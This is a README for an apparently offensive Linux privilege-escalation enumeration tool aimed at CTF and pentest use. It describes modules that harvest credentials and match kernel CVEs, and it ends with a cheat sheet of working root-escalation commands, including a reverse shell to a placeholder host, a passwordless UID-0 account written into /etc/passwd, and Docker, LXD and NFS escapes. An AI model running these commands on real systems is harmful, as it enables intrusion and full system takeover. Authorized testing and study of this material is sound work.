# 🔓 LucuiecPrivEsc — Linux Privilege Escalation Tool v1.0

> ⚠️ **For authorized use ONLY.**  
> Legal environments: your own VMs · TryHackMe · HackTheBox · CTF labs.

---

## 📦 Installation

```bash
# 1. Clone or copy the tool to the target machine
git clone https://github.com/YOUR_USERNAME/LucuiecPrivEsc.git
cd privesc

# 2. Install the only dependency
pip install colorama

# Or on Kali if pip complains:
pip install colorama --break-system-packages

# 3. Run it
python privesc.py
```

> **No internet needed on target** — the tool only uses Python stdlib + colorama.  
> If colorama is not available, the tool still works — just without colors.

---

## 🗂️ Project Structure

```
privesc/
│
├── privesc.py                    ← 🚀 Entry point (run this)
│
├── requirements.txt              ← colorama only
│
├── modules/
│   ├── __init__.py
│   ├── sysinfo.py                ← 🖥️  OS, kernel, env vars, network, mounts
│   ├── users_creds.py            ← 👤 sudo -l, shadow, SSH keys, history, .env files
│   ├── suid_caps.py              ← 🔑 SUID/SGID binaries + Linux capabilities
│   ├── cron_writable.py          ← ⏰ Cron jobs, writable /etc/passwd, PATH hijack
│   ├── kernel_exploits.py        ← 💣 DirtyPipe, DirtyCow, PwnKit, Baron Samedit
│   └── misc_checks.py            ← 🔍 Docker/LXD escape, NFS, processes, LD_PRELOAD
│
├── utils/
│   ├── __init__.py
│   └── output.py                 ← 🎨 Colors, printing helpers, run_cmd, save results
│
└── results/                      ← 📊 Auto-created — JSON reports saved here
```

---

## ⚡ Usage

### Full scan (recommended)
```bash
python privesc.py
```

### Quick scan — highest impact checks only (fastest)
```bash
python privesc.py --quick
```

### Parallel mode — all modules run simultaneously (fastest full scan)
```bash
python privesc.py --all --parallel
```

### Run a single module
```bash
python privesc.py --users       # sudo, shadow, SSH keys, history
python privesc.py --suid        # SUID/SGID + capabilities
python privesc.py --cron        # Cron jobs + writable files
python privesc.py --kernel      # Kernel exploits
python privesc.py --misc        # Containers, NFS, processes
python privesc.py --sysinfo     # System information
```

### Save results to custom directory
```bash
python privesc.py --all -o /tmp/myresults
```

### Don't save results
```bash
python privesc.py --all --no-save
```

### Show only critical findings
```bash
python privesc.py --all --critical-only
```

---

## 🧠 Modules Explained

### 1. System Info (`sysinfo.py`)
Collects the full picture of the target system:
- OS release, kernel version, architecture
- Environment variables — scans for hardcoded passwords, API keys, tokens
- Network interfaces, open ports, routes, `/etc/hosts`
- Mounted filesystems — flags NFS/CIFS network mounts

### 2. Users & Credentials (`users_creds.py`)
The most common privesc sources:
- **`sudo -l`** — lists sudo permissions and matches against **GTFOBins** with exact exploit command
- **`/etc/passwd`** — finds hidden UID=0 accounts, lists shell users
- **`/etc/shadow`** — checks if readable (requires root or shadow group) and extracts hashes
- **SSH private keys** — searches entire filesystem for readable `id_rsa`, `id_dsa`, `.pem` files
- **Bash/Zsh history** — scans for passwords typed in commands (`mysql -pPassword`, `sshpass -p`)
- **Credential files** — `.netrc`, `.pgpass`, `.my.cnf`, `.aws/credentials`, `wp-config.php`, `.env`

### 3. SUID / SGID / Capabilities (`suid_caps.py`)
SUID binaries run as their owner (usually root) regardless of who executes them:
- Finds **all SUID/SGID binaries** on the filesystem
- Matches against **60+ GTFOBins entries** — prints the exact exploit command
- Checks **Linux capabilities** (`cap_setuid`, `cap_dac_override`, `cap_sys_admin`...) — these can grant root-equivalent powers to specific programs
- Checks if any SUID binary path is **writable** — replace it with a shell

### 4. Cron Jobs & Writable Files (`cron_writable.py`)
Running scripts as root with writable files = easy root:
- Reads all cron locations (`/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/`...)
- Checks if any **script executed by root cron is writable** → inject reverse shell
- Checks if **cron script directories are writable** → drop malicious file
- Detects **wildcard injection** in cron (`tar *`, `chown *`, `chmod *`)
- Checks writable **critical files**: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/profile`
- Checks **PATH directories** for writability → PATH hijacking
- Checks writable **systemd service files** running as root

### 5. Kernel Exploits (`kernel_exploits.py`)
Matches the running kernel against known CVEs:

| Exploit | CVE | Affected Versions |
|---|---|---|
| DirtyPipe | CVE-2022-0847 | 5.8 – 5.16.11 |
| DirtyCow | CVE-2016-5195 | 2.6.22 – 4.8.3 |
| PwnKit | CVE-2021-4034 | All (pkexec) |
| Baron Samedit | CVE-2021-3156 | sudo < 1.9.5p2 |
| OverlayFS | CVE-2021-3493 | Ubuntu < 5.11 |
| OverlayFS 2023 | CVE-2023-0386 | < 6.2 |
| Netfilter | CVE-2022-25636 | 5.4 – 5.6.10 |
| Sudo Bypass | CVE-2019-14287 | sudo < 1.8.28 |
| PTRACE | CVE-2019-13272 | < 5.1.17 |

Also checks installed software versions: Apache, Nginx, MySQL, PHP, Screen, Docker.

### 6. Misc Checks (`misc_checks.py`)
- **Docker escape** — privileged container, mounted docker socket, host filesystem mounts
- **LXD/LXC escape** — checks lxd group membership
- **Kubernetes** — reads service account token, checks cluster permissions
- **NFS no_root_squash** — remote root file creation exploit
- **Root processes** — finds root-owned scripts that are writable
- **Interesting files** — hunts for `.env`, `wp-config.php`, flags (`user.txt`, `root.txt`), backups, SSH keys
- **LD_PRELOAD hijacking** — checks if sudo preserves `LD_PRELOAD` for shared library injection

---

## 🎨 Output Color Guide

| Color | Meaning |
|---|---|
| 🔴 RED BOLD `[!!!]` | Critical — direct privesc path found |
| 🟢 GREEN `[+]` | Found — something noteworthy |
| 🔵 BLUE `[*]` | Info — general information |
| 🟡 YELLOW `[-]` | Warning — worth investigating |
| 🔴 RED `[!]` | Error — something failed |

---

## 📊 Output Report

Results are auto-saved as JSON in `results/`:
```bash
results/privesc_20260309_120000.json
```

The JSON contains all raw findings from every module — useful for:
- Keeping a record of the scan
- Parsing with other tools
- Writing your pentest report

---

## 🎯 Common Privesc Paths (Cheat Sheet)

### sudo NOPASSWD binary found
```bash
# Check GTFOBins for the binary, example for find:
sudo find . -exec /bin/bash -p \; -quit
```

### SUID python3 found
```bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### Writable /etc/passwd
```bash
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

### Writable cron script
```bash
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /path/to/script.sh
# Wait for cron to execute
```

### cap_setuid on python3
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Docker group
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### LXD group
```bash
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc && lxc exec privesc /bin/sh
```

### NFS no_root_squash (run on attacker machine)
```bash
mount -o rw,vers=2 TARGET_IP:/share /tmp/nfs
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
# On victim:
/tmp/nfs/bash -p
```

---

## 🆚 Why Better Than LinPEAS?

| Feature | PrivEsc | LinPEAS |
|---|---|---|
| Language | Python 3 | Bash |
| Exact exploit commands | ✅ Printed per finding | ❌ Just highlights |
| GTFOBins matching | ✅ 60+ binaries | ✅ |
| Kernel CVE database | ✅ Built-in | ✅ |
| Parallel execution | ✅ `--parallel` flag | ❌ |
| JSON output | ✅ Structured report | ❌ |
| No bash needed | ✅ Pure Python | ❌ |
| Container escapes | ✅ Docker+LXD+K8s | ✅ |
| Customizable modules | ✅ Run specific checks | ❌ |

---

## ⚖️ Legal Notice

This tool is for **authorized penetration testing and CTF challenges only**.  
Running this on systems you don't own or have permission to test is illegal.

Safe environments: [TryHackMe](https://tryhackme.com) · [HackTheBox](https://hackthebox.com) · [VulnHub](https://vulnhub.com) · your own VMs
